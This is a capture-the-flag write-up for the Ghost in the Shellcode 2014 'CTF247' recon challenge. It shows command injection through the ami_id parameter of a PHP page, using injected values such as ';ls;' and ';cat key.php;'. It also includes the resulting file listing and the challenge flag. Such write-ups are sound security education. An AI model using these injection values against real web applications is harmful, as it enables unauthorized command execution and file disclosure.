# Ghost in the Shellcode 2014: CTF247

**Category:** Recon
**Points:** 100
**Description:**

> CTF247 is awesome <http://ctf247.2014.ghostintheshellcode.com/>

## Write-up

The `ami_id` parameter on [the ‘Fortress’ page](http://ctf247.2014.ghostintheshellcode.com/ec2.php) is vulnerable to command injection.

The response bodies for [`/ec2.php?ami_id=;ls;`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=;ls;) or [`/ec2.php?ami_id=%0als%0a`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=%0als%0a) start with:

```
ec2-api-tools-1.6.12.0
ec2.php
index.html
index_files
key.php
```

Aha! There’s a file named `key.php`. Let’s see what it says by visiting [`/ec2.php?ami_id=;cat%20key.php;`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=;cat%20key.php;) or [`/ec2.php?ami_id=%0acat%20key.php%0a`](http://ctf247.2014.ghostintheshellcode.com/ec2.php?ami_id=%0acat%20key.php%0a):

```php
<?php
  /* flag{0aea26e968895efa40b563e3e8fe8f19} */
  echo('There\'s a key here.');
?>
```

## Other write-ups and resources

* <http://blogs.tunelko.com/2014/01/19/ghost-in-the-shellcode-2014-write-up-ctf247/>
* <http://insertco.in/2014/01/19/ctf247-gits-2014/>
